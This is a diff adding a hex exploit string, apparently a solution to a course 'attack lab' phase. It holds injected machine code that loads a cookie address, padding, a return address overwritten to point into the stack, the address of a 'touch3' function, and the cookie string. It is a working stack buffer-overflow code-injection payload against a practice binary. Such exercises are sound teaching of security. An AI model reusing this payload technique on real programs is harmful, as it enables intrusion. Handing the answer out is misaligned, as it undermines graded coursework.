@@ -1,0 +1,10 @@
+48 c7 c7 80 9d 61 55 c3 /* rsp + 0x48 address where cookie is */
+00 00 00 00 00 00 00 00 /* padding for 56 bytes */
+00 00 00 00 00 00 00 00 /* padding for 56 bytes */
+00 00 00 00 00 00 00 00 /* padding for 56 bytes */
+00 00 00 00 00 00 00 00 /* padding for 56 bytes */
+00 00 00 00 00 00 00 00 /* padding for 56 bytes */
+00 00 00 00 00 00 00 00 /* padding for 56 bytes */
+38 9d 61 55 00 00 00 00 /* address of %rsp */
+c8 19 40 00 00 00 00 00 /* address of touch3 */
+32 37 36 61 64 65 65 37 00 /* cookie as a string */
